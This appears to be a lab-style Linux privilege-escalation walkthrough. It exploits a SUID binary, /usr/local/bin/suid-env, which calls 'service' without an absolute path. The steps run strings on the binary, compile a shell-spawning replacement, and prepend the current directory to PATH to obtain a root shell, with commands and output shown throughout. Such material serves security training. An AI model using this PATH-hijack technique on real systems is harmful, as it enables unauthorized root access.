The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:
```
/usr/local/bin/suid-env
```
```
user@debian:~$ /usr/local/bin/suid-env
[....] Starting web server: apache2httpd (pid 1646) already running
. ok 
```
Run strings on the file to look for strings of printable characters:
```
strings /usr/local/bin/suid-env
```
```
user@debian:~$ strings /usr/local/bin/suid-env
/lib64/ld-linux-x86-64.so.2
5q;Xq
__gmon_start__
libc.so.6
setresgid
setresuid
system
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l$ L
t$(L
|$0H
service apache2 start
```
One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:
```
gcc -o service /home/user/tools/suid/service.c
```
Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:
```
PATH=.:$PATH /usr/local/bin/suid-env
```
```
user@debian:~$ PATH=.:$PATH /usr/local/bin/suid-env
user@debian:~$ /usr/local/bin/suid-env
...
root@debian:~#
```